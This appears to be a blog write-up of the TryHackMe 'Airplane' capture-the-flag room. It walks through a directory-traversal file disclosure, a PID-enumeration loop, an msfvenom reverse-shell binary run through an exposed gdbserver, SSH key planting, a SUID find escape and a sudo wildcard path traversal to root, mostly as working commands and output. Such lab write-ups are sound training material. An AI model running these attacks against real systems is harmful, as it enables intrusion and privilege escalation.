---
title: 'TryHackMe: Airplane'
author: jaxafed
categories: [TryHackMe]
tags: [web, file disclosure, gdb, suid, sudo]
render_with_liquid: false
media_subpath: /images/tryhackme_airplane/
image:
  path: room_image.webp
---

Airplane started with discovering a file disclosure vulnerability in a web application. This vulnerability allowed us to identify another service running on a different port.<br>
Knowing the service, we were able to exploit it to get a shell. With shell access, we leveraged a setuid (SUID) binary to escalate privileges to another user.<br>
As this user, we could run a sudo command with a wildcard that allowed us to use a path traversal payload to escalate to root.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/airplane){: .center }

## Initial Enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.47.54
Nmap scan report for 10.10.47.54
Host is up (0.093s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
|_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
6048/tcp open  x11?
8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are three ports open:

- 22/SSH
- 6048/?
- 8000/HTTP

Additionally, `nmap` notifies us that port 8000 redirects to `airplane.thm`. We will add it to our hosts file.

```
10.10.47.54 airplane.thm
```
{: file="/etc/hosts"}

### Port 8000

When visiting `http://airplane.thm:8000/`, we get redirected to `http://airplane.thm:8000/?page=index.html`. It displays a static page about airplanes.

![Web 8000 Index](web_8000_index.webp){: width="1200" height="600" }

## Shell as hudson

### Discovering The File Disclosure Vulnerability

One interesting thing about how the page is displayed is the `page` parameter.

Testing it for directory traversal with the `/?page=../../../../etc/passwd` payload, we are able to read files on the system.

![Web 8000 File Disclosure Passwd](web_8000_file_disclosure_passwd.webp){: width="1000" height="500" }

There are three users with shell access.

```
root:x:0:0:root:/root:/bin/bash
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
hudson:x:1001:1001::/home/hudson:/bin/bash
```

Checking the `/proc/self/status` file, we can see that the current process (webserver) is running as the `hudson` user.

![Web 8000 File Disclosure Status](web_8000_file_disclosure_status.webp){: width="1000" height="400" }

Using `/proc/self/cmdline`, we can retrieve the command for the current process.

```console
$ curl -s 'http://airplane.thm:8000/?page=../../../../proc/self/cmdline' | sed 's/\x00/ /g'
/usr/bin/python3 app.py                                                                                                        
```

> The `cmdline` file holds the command line arguments separated by a null byte. We can use the `sed` command to replace them with a space instead.
{: .prompt-tip }

Now, we can use the `/?page=../../../../proc/self/cwd/app.py` payload to read the source code for the web application.

```console
$ curl -s 'http://airplane.thm:8000/?page=../../../../proc/self/cwd/app.py'
```
```python
from flask import Flask, send_file, redirect, render_template, request
import os.path

app = Flask(__name__)


@app.route('/')
def index():
    if 'page' in request.args:
        page = 'static/' + request.args.get('page')

        if os.path.isfile(page):
            resp = send_file(page)
            resp.direct_passthrough = False

            if os.path.getsize(page) == 0:
                resp.headers["Content-Length"]=str(len(resp.get_data()))

            return resp

        else:
            return "Page not found"

    else:
        return redirect('http://airplane.thm:8000/?page=index.html', code=302)


@app.route('/airplane')
def airplane():
    return render_template('airplane.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)                                                                                         
```

> The `/proc/self/cwd` is a symlink to the current working directory for the process.
{: .prompt-tip }

Checking the source code for the web application, it doesn't seem like there's anything interesting other than the file disclosure vulnerability. We're also not able to find any low-hanging fruit like the user's `SSH` key.


### Identifying The Service on Port 6048

Since there is another service running on port 6048 that we don't know anything about, we can leverage this file disclosure vulnerability to identify it.

By reading the `/proc/net/tcp` file, we can discover the service on port 6048 is running as the `hudson` user (uid = 1001).

```console
$ curl -s 'http://airplane.thm:8000/?page=../../../../proc/net/tcp'
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                               
...
   4: 00000000:17A0 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 19341 1 0000000000000000 100 0 0 10 0
...
```

> In the /proc/net/tcp file, the port is stored in hexadecimal format (0x17A0, which translates to 6048).
{: .prompt-tip }

Knowing that the same user runs the other service, we can likely read its command line as well.

To achieve this, we'll need the process ID (PID) for the service, and since it's unknown, we can fuzz for all possible PIDs, attempting to read the command line for each.

For this, we can use the following one-liner Bash script:

```bash
for i in {1..1000}; do echo -n "\r$i"; out=$(curl -s "http://airplane.thm:8000/?page=../../../../../proc/$i/cmdline" | sed 's/\x00/ /g' | grep -v 'Page not found'); if [ -n "$out" ]; then echo "\r$i : $out"; fi; done
```
{: .wrap }

The script creates a `for` loop to iterate through numbers from 1 to 1000, and for every number, it tries to read the `/proc/<number>/cmdline` file, and if the file is not empty, it echoes the output.

Upon running it, we get the command for the service on port 6048 with `/proc/539/cmdline`. It is running `gdbserver`.

```console
$ for i in {1..1000}; do echo -n "\r$i"; out=$(curl -s "http://airplane.thm:8000/?page=../../../../../proc/$i/cmdline" | sed 's/\x00/ /g' | grep -v 'Page not found'); if [ -n "$out" ]; then echo "\r$i : $out"; fi; done
...
539 : /usr/bin/gdbserver 0.0.0.0:6048 airplane
...
```
{: .wrap }


### Abusing gdbserver To Get A Shell

Now that we know `gdbserver` is running on port `6048`, we can use the method from [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver#upload-and-execute) to get a shell.

Basically, what we will do is generate a reverse shell payload as an `elf` file. Connect to the remote gdb server, upload our binary to the server, change the executable to debug to our binary, and run it.

First, creating the reverse shell payload using `msfvenom`.

```console
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.72.22 LPORT=443 PrependFork=true -f elf -o binary.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Final size of elf file: 226 bytes
Saved as: binary.elf
```

Starting the `gdb` and connecting to the remote server.

```console
$ gdb binary.elf

(gdb) target extended-remote airplane.thm:6048
Remote debugging using airplane.thm:6048
```

Uploading our binary to the `/tmp` directory.

```console
(gdb) remote put binary.elf /tmp/binary.elf
Successfully sent file "binary.elf".
```

Changing the executable to debug to our binary.

```console
(gdb) set remote exec-file /tmp/binary.elf
```

Starting our listener and running it, we get a shell.

```console
(gdb) r
Starting program: /home/kali/tryhackme/airplane/binary.elf
Reading /usr/lib/debug/.build-id/e9/8c2a320466a026c0a0236da38a5156f9b8cb54.debug from remote target...
warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
[Detaching after fork from child process 3084]
[Inferior 1 (process 3083) exited normally]
```

Now that we have a shell as the `hudson` user, we can drop an SSH key and use SSH to get a better shell.

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.47.54] 44750
id
uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICmoQnk7E5HqYlAGSHEFJIS46QbkcopF80bN4LTmCmkL kali@kali >> /home/hudson/.ssh/authorized_keys
```

```console
$ ssh -i id_ed25519 hudson@airplane.thm
hudson@airplane:~$
```

## Shell as carlos

### Suid Binary

Checking for any binaries with the `suid` bit set, we notice `/usr/bin/find`.

```console
hudson@airplane:~$ find / -type f -perm -u=s 2>/dev/null
/usr/bin/find
...
```
It is owned by the `carlos` user.

```console
hudson@airplane:~$ ls -la /usr/bin/find
-rwsr-xr-x 1 carlos carlos 320160 Şub 18  2020 /usr/bin/find
```

We can use the command from [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid) to get a shell as `carlos`.

```console
hudson@airplane:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
$ id
uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
```

Same as before, we can write to `authorized_keys` to get a better shell.

```console
$ echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICmoQnk7E5HqYlAGSHEFJIS46QbkcopF80bN4LTmCmkL kali@kali >> /home/carlos/.ssh/authorized_keys
$ chmod 600 /home/carlos/.ssh/authorized_keys
```

After using SSH to get a shell, we can read the user flag.

```console
$ ssh -i id_ed25519 carlos@airplane.thm
carlos@airplane:~$ wc -c user.txt
33 user.txt
```

## Shell as root

### Path Traversal in Sudo Command

Checking the sudo privileges for the `carlos` user, we are able to run `/usr/bin/ruby /root/*.rb` as root.

```console
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

Wildcard (\*) in the sudo command allows us to put anything between `/root/` and `.rb`.

We can abuse this with a path traversal payload to run any `ruby` script we want.

First, creating a `ruby` script that will spawn a shell.

```console
carlos@airplane:~$ echo 'exec "/bin/sh"' > /tmp/shell.rb
```

Now, using a path traversal payload, we run our `ruby` script to get shell as `root` and can read the root flag.

```console
carlos@airplane:~$ sudo /usr/bin/ruby /root/../tmp/shell.rb
# id
uid=0(root) gid=0(root) groups=0(root)
# wc -c /root/root.txt
33 /root/root.txt
```


<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>
